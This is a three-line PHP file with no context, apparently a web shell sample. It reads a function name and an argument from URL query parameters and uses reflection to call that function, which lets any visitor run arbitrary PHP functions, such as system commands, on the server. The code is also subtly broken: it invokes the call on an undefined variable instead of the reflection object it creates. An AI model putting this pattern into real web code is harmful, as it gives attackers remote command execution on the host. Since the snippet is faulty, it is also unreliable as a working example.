<?php
$r = new ReflectionFunction($_GET["fn"]);
echo $other->invokeArgs(array($_GET["arg"]));
